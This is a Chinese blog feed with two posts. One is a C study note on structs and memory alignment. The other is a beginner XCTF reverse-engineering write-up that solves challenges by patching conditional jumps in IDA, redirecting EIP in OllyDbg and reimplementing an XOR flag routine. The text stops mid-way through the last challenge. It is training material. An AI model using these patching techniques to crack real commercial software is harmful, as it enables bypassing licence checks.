<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to Chumen77&#39;s Blog</title>
  
  <subtitle>Struggle 就完事了 !</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://chumen77.github.io/"/>
  <updated>2019-11-12T13:08:05.000Z</updated>
  <id>https://chumen77.github.io/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C语言与反汇编学习（五）</title>
    <link href="https://chumen77.github.io/2019/11/12/%20C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>https://chumen77.github.io/2019/11/12/ C语言与反汇编学习（五）/</id>
    <published>2019-11-12T12:18:49.000Z</published>
    <updated>2019-11-12T13:08:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（五）"><a href="#C语言与反汇编学习（五）" class="headerlink" title="C语言与反汇编学习（五）"></a>C语言与反汇编学习（五）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。<strong>集中于结构体部分以及结构体对齐的知识。</strong></p><h2 id="结构体的使用练习"><a href="#结构体的使用练习" class="headerlink" title="结构体的使用练习"></a>结构体的使用练习</h2><p>1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息    。<br>要求：<br>    (1) 具体包含哪些信息自由设计<br>    (2) 但这些包含的类型中，必须要有一个成员是结构体类型。<br>    2、定义一个函数，用来给这个结构体变量赋值.<br>3、定义一个函数，用来显示这个结构体变量的所有成员信息.                                    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">struct point</span><br><span class="line">&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">    int z;</span><br><span class="line">&#125;;</span><br><span class="line">struct Gamer</span><br><span class="line">&#123;</span><br><span class="line">    char name[20];</span><br><span class="line">    int level;</span><br><span class="line">    float HP;</span><br><span class="line">    point a;</span><br><span class="line">&#125;No1;</span><br><span class="line">void Function()</span><br><span class="line">&#123;</span><br><span class="line">    char a[]=&quot;xiaozhi&quot;;</span><br><span class="line">    for (int i = 0; i &lt;strlen(a) ; ++i) &#123;</span><br><span class="line">        No1.name[i]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    No1.level = 99;</span><br><span class="line">    No1.HP = 99.9;</span><br><span class="line">    No1.a.x=6;</span><br><span class="line">    No1.a.y=5;</span><br><span class="line">    No1.a.z=9;</span><br><span class="line">&#125;</span><br><span class="line">void Display()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;name:%s level:%d HP:%f point:%d %d %d &quot;,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    Function();</span><br><span class="line">    Display();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sizeof的使用"><a href="#sizeof的使用" class="headerlink" title="sizeof的使用"></a>sizeof的使用</h2><h3 id="基本类型的sizeof"><a href="#基本类型的sizeof" class="headerlink" title="基本类型的sizeof"></a>基本类型的sizeof</h3><p>可以使用类型，也可以使用变量<br>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%d\n&quot;,sizeof(char)); </span><br><span class="line">printf(&quot;%d\n&quot;,sizeof(int));   </span><br><span class="line">printf(&quot;%d\n&quot;,sizeof(float));</span><br><span class="line">printf(&quot;%d\n&quot;,sizeof(double));</span><br><span class="line">int x = 10;//变量</span><br><span class="line">printf(&quot;%d\n&quot;,sizeof(x));</span><br><span class="line">```</span><br><span class="line">### 数组类型的sizeof</span><br><span class="line">例子：</span><br></pre></td></tr></table></figure><p>char arr1[10] = {0};<br>short arr2[10] = {0};<br>int arr3[10] = {0};                </p><p>printf(“%d\n”,sizeof(arr1));                //10<br>printf(“%d\n”,sizeof(arr2));            //    20<br>printf(“%d\n”,sizeof(arr3));            //    40</p><p>printf(“%d\n”,sizeof(arr1[10]));            //    1<br>printf(“%d\n”,sizeof(arr2[10]));            //    2<br>printf(“%d\n”,sizeof(arr3[10]));                //4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注意其中的不同。</span><br><span class="line"></span><br><span class="line">## 结构体（内存）对齐</span><br><span class="line">### 为什么要有内存对齐？</span><br><span class="line">本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。</span><br><span class="line">### pragma pack的基本用法</span><br><span class="line">在vc6.0++中默认值是8字节对齐。</span><br></pre></td></tr></table></figure><pre><code>#pragma pack( n )结构体。#pragma pack(  )</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">该操作会改变一个结构体的字节对齐数，这是针对编译器的。</span><br><span class="line">对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。</span><br><span class="line">如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，**即是说，结构体成员的偏移量应该取二者的最小值.**</span><br></pre></td></tr></table></figure><p>#pragma pack(n)<br>struct Test<br>{<br>     int a ;<br>     __int64 b ;<br>     char c ;<br>};            </p><p>#pragma pack()            </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下是各种情况的内存对齐分析:</span><br><span class="line">1:1字节对齐</span><br><span class="line">![-w155](/images/15735626712023.jpg)</span><br><span class="line">2:2字节对齐时：</span><br><span class="line">![-w266](/images/15735626990588.jpg)</span><br><span class="line">3：4个字节对齐</span><br><span class="line">![-w381](/images/15735627321430.jpg)</span><br><span class="line">4、8个字节对齐</span><br><span class="line"></span><br><span class="line">![-w583](/images/15735627463362.jpg)</span><br><span class="line">### 对齐原则：</span><br><span class="line"></span><br><span class="line">原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储).</span><br><span class="line"></span><br><span class="line">原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。</span><br><span class="line">原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。**(struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.)**</span><br><span class="line"></span><br><span class="line">原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.</span><br><span class="line">也就是说，结构体成员的偏移量应该取二者的最小值.</span><br><span class="line"></span><br><span class="line">**由浅入深，分析内存对齐原则后内存到底是怎么分配的**</span><br><span class="line">#### 案例分析一：</span><br></pre></td></tr></table></figure><p>struct Test<br>{<br>    char  a;<br>    int b ;<br>};                </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![-w671](/images/15735632219948.jpg)</span><br><span class="line">**sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数)**</span><br><span class="line"></span><br><span class="line">#### 案例二分析：</span><br></pre></td></tr></table></figure><p>struct Test<br>{<br>    int a ;<br>    __int64 b ;<br>    char c ;<br>};                    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![-w621](/images/15735634186981.jpg)</span><br><span class="line">**sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数)**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 案例三分析：</span><br></pre></td></tr></table></figure><p>struct Test<br>{<br>    int a ;<br>    __int64 b ;<br>    char c ;<br>    char d ;<br>};                    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![-w662](/images/15735635119907.jpg)</span><br><span class="line"></span><br><span class="line">**sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数)**</span><br><span class="line"></span><br><span class="line">#### 案例四分析：</span><br></pre></td></tr></table></figure><p>struct S1<br>{<br>    char c;<br>    double i;<br>};        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![-w530](/images/15735636051365.jpg)</span><br><span class="line"></span><br><span class="line">**sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数)**</span><br><span class="line"></span><br><span class="line">####  案例五分析：</span><br></pre></td></tr></table></figure><p>struct S2<br>{<br>    int c1;<br>    char c2[10];<br>};    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![-w547](/images/15735636961393.jpg)</span><br><span class="line"></span><br><span class="line">**sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数)**</span><br><span class="line"></span><br><span class="line">#### 案例六分析：</span><br></pre></td></tr></table></figure><p>struct S3<br>{<br>    char c1;<br>    S1 s;<br>    char c2;<br>    char c3;<br>};</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![-w539](/images/15735637638057.jpg)</span><br><span class="line"></span><br><span class="line">**sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数)**</span><br><span class="line"></span><br><span class="line">#### 案例七分析：</span><br></pre></td></tr></table></figure><p>struct S4<br>{<br>    char c1;<br>    S1 s;<br>    char c2;<br>    double c3;<br>};    </p><pre><code>{% image /images/15735639114324.jpg '-w558' '' %}**sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)**</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（五）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（五）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（五）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（五）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Xctf_RE新手区WP</title>
    <link href="https://chumen77.github.io/2019/11/09/Xctfre_%E6%96%B0%E6%89%8B%E5%8C%BAwp/"/>
    <id>https://chumen77.github.io/2019/11/09/Xctfre_新手区wp/</id>
    <published>2019-11-09T03:22:03.000Z</published>
    <updated>2019-11-10T13:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xctf-RE新手区WP"><a href="#Xctf-RE新手区WP" class="headerlink" title="Xctf_RE新手区WP"></a>Xctf_RE新手区WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>第一步，先查壳：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15732702605654.jpg" alt="-w625" title>                </div>                <div class="image-caption">-w625</div>            </figure><p>（查壳很重要，可以先确认是否有壳还可以知道程序是什么语言编写的）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733071101333.jpg" alt="-w656" title>                </div>                <div class="image-caption">-w656</div>            </figure><p>看下程序是干嘛的，也就是你输入flag然后程序出个判断是否正确。<strong>估计就是个明文对比</strong>，直接od打开：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733074111357.jpg" alt="-w911" title>                </div>                <div class="image-caption">-w911</div>            </figure><p>断在了re模块。直接搜索字符串<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733075097915.jpg" alt="-w673" title>                </div>                <div class="image-caption">-w673</div>            </figure></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733072667813.jpg" alt="-w801" title>                </div>                <div class="image-caption">-w801</div>            </figure><p>拿到flag</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>还是先查壳：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733077161080.jpg" alt="-w519" title>                </div>                <div class="image-caption">-w519</div>            </figure><p>无壳<br>这道题有多种做法，下面展示三种：</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>这个做法主要是判断程序逻辑，然后改关键跳转的汇编代码，进行爆破破解。</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733079095740.jpg" alt="-w678" title>                </div>                <div class="image-caption">-w678</div>            </figure><p>先看下程序是做什么的：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733079517175.jpg" alt="-w545" title>                </div>                <div class="image-caption">-w545</div>            </figure><p>先输入个1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733079675395.jpg" alt="-w507" title>                </div>                <div class="image-caption">-w507</div>            </figure><p>发现图案中第1，2，8行图形发生了变化。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733082372049.jpg" alt="-w659" title>                </div>                <div class="image-caption">-w659</div>            </figure><p>接着输入2，然后第3，4，8行图形发生了变化。感觉没什么规律，大概猜一下，应该是这8行的线条全部连通就可以完成这个游戏。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733085847753.jpg" alt="-w607" title>                </div>                <div class="image-caption">-w607</div>            </figure><h4 id="打开IDA进行静态分析"><a href="#打开IDA进行静态分析" class="headerlink" title="打开IDA进行静态分析"></a>打开IDA进行静态分析</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733087052533.jpg" alt="-w489" title>                </div>                <div class="image-caption">-w489</div>            </figure><p>发现一堆函数难以找到主函数，按<code>shift+F12</code>查看字符串</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733088311433.jpg" alt="-w909" title>                </div>                <div class="image-caption">-w909</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733088160599.jpg" alt="-w865" title>                </div>                <div class="image-caption">-w865</div>            </figure><p>点击这个，查看一下这个字符串的交叉引用，然后可以双击跳转到main函数，看整个程序的逻辑。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733091045568.jpg" alt="-w746" title>                </div>                <div class="image-caption">-w746</div>            </figure><p>跳转好后按F5查看伪代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733092783647.jpg" alt="-w471" title>                </div>                <div class="image-caption">-w471</div>            </figure><p>在下方发现了一个判断语句，满足后会调用sub_45Ab4这个函数。双击进入看看这个函数做了什么：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733094560784.jpg" alt="-w465" title>                </div>                <div class="image-caption">-w465</div>            </figure><p>发现会出现这个字符串，然后：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733094810614.jpg" alt="-w387" title>                </div>                <div class="image-caption">-w387</div>            </figure><p>还经过一堆数据和异或后返回一个字符串。那这个应该就是返回flag了。<strong>那就是想办法让程序调用<code>sub_45Ab4</code>这个函数就可以了。</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733096364506.jpg" alt="-w307" title>                </div>                <div class="image-caption">-w307</div>            </figure><p>再看一下这个if语句里面正好是对一个容量为8的数组进行判断，对应刚刚程序中的8行，正好对应当8行直线全部连接（也可以认为是图案全变）就会调用输出flag的函数。</p><p>那现在需要做的就很明确的，直接改程序流程，IDA的patch是可以做到的，结合刚刚我们输入1的时候回让1，2，8行进行改变，那我们就在这几处做改变就可以了。</p><h4 id="IDA-Patch"><a href="#IDA-Patch" class="headerlink" title="IDA Patch"></a>IDA Patch</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733100087904.jpg" alt="-w423" title>                </div>                <div class="image-caption">-w423</div>            </figure><p>看主函数的流程图模式，专门找这个跳转指令JNZ，数一下8个就是刚刚的8个判断了。对应刚刚的想法我们在</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733100975029.jpg" alt="-w394" title>                </div>                <div class="image-caption">-w394</div>            </figure><p>这几处的汇编代码进行patch：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733101571151.jpg" alt="-w504" title>                </div>                <div class="image-caption">-w504</div>            </figure><p><strong>把JNZ改成正好相反的JZ</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733107484458.jpg" alt="-w460" title>                </div>                <div class="image-caption">-w460</div>            </figure><p>修改好后查看下生成的伪代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733107946575.jpg" alt="-w375" title>                </div>                <div class="image-caption">-w375</div>            </figure><p>达到了我们想要的结果。<br>然后我们需要把这些打patch的地方保存下来，让其成效：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733103617647.jpg" alt="-w1324" title>                </div>                <div class="image-caption">-w1324</div>            </figure><p>点击ok即可，可以为了安全选择一下做个bak备份。</p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733108996551.jpg" alt="-w564" title>                </div>                <div class="image-caption">-w564</div>            </figure><p>输入1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733109139764.jpg" alt="-w661" title>                </div>                <div class="image-caption">-w661</div>            </figure><p>拿到了flag。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>这种主要是在IDA中静态分析后知道了，在程序调用输出flag函数后flag就打印出来了。就可以想办法在动态调试中直接调用这个函数就可以了。重在IDA和OD搭配使用了。</p><h4 id="IDA寻找输出flag函数的函数地址"><a href="#IDA寻找输出flag函数的函数地址" class="headerlink" title="IDA寻找输出flag函数的函数地址"></a>IDA寻找输出flag函数的函数地址</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733116649387.jpg" alt="-w829" title>                </div>                <div class="image-caption">-w829</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733116800264.jpg" alt="-w702" title>                </div>                <div class="image-caption">-w702</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733118131519.jpg" alt="-w688" title>                </div>                <div class="image-caption">-w688</div>            </figure><p>记住这个0045E940 地址。下面OD直接想办法执行到该地址</p><h4 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733122639383.jpg" alt="-w498" title>                </div>                <div class="image-caption">-w498</div>            </figure><p>发现基地址是010F<br>在OD中搜索字符串，找一下我们应该在哪个地方找一个合适的可以控制的代码段。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733124212188.jpg" alt="-w692" title>                </div>                <div class="image-caption">-w692</div>            </figure><p>发现了输入n的语句地址。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733124483702.jpg" alt="-w695" title>                </div>                <div class="image-caption">-w695</div>            </figure><p>设置一个断点，运行程序。F9让程序运行到这里断下来。按空格修改下汇编代码<code>jmp 0x010FE490</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733126763356.jpg" alt="-w688" title>                </div>                <div class="image-caption">-w688</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733126850272.jpg" alt="-w205" title>                </div>                <div class="image-caption">-w205</div>            </figure><p>这时候的EIP，然后单步执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733127939834.jpg" alt="-w869" title>                </div>                <div class="image-caption">-w869</div>            </figure><p>过来了，到了调用输出flag的函数。然后接下来会有很多循环和字符处理的操作，直接可以按CTRL+F8按键让OD自动执行。让把这个函数处理完，就会出现flag字符串。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733127636852.jpg" alt="-w674" title>                </div>                <div class="image-caption">-w674</div>            </figure><p>这种修改EIP是重点和找到合适可控制代码段是重点，我们还可以<br>在找到一个可以控制代码后，在搜索字符串中找到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733133763253.jpg" alt="-w637" title>                </div>                <div class="image-caption">-w637</div>            </figure><p>单击过去，然后在这个函数的开头设置为新的EIP</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733132918043.jpg" alt="-w622" title>                </div>                <div class="image-caption">-w622</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733134257814.jpg" alt="-w208" title>                </div>                <div class="image-caption">-w208</div>            </figure><p>然后按一下F8就来到了这个函数里面了。再进行刚刚的操作就可以了。</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这个就是我们找到了关键函数，分析以后是可以把这个函数是写出来的，然后根据伪代码写出原来的程序就可以了。</p><h4 id="OD静态分析"><a href="#OD静态分析" class="headerlink" title="OD静态分析"></a>OD静态分析</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733137173061.jpg" alt="-w682" title>                </div>                <div class="image-caption">-w682</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733137433462.jpg" alt="-w521" title>                </div>                <div class="image-caption">-w521</div>            </figure><p>调用其函数。双击进入F5生成伪代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733137975116.jpg" alt="-w555" title>                </div>                <div class="image-caption">-w555</div>            </figure><p>（只是截取一部分）分析可以得知是分成了2个字符数组，一个V2到V58，一个V59到V115，都是56的长度，然后下面就是两个异或操作了。直接改成C代码，因为还不会写Python。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">        int i;</span><br><span class="line">        char arr1[]=&#123;123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0&#125;;</span><br><span class="line">        char arr2[]=&#123;18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0&#125;;</span><br><span class="line">        for ( i = 0; i &lt; 56; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            arr1[i] ^= arr2[i];</span><br><span class="line">            arr1[i] ^= 0x13u;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%s&quot;,arr1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733139966832.jpg" alt="-w734" title>                </div>                <div class="image-caption">-w734</div>            </figure><p>运行就拿到了flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的<br>肯定是进行了某种加密。</p><h3 id="先查壳"><a href="#先查壳" class="headerlink" title="先查壳"></a>先查壳</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733878960896.jpg" alt="-w544" title>                </div>                <div class="image-caption">-w544</div>            </figure><p>无壳，32位c++程序</p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/09/Xctfre_新手区wp/images/15733879199369.jpg" 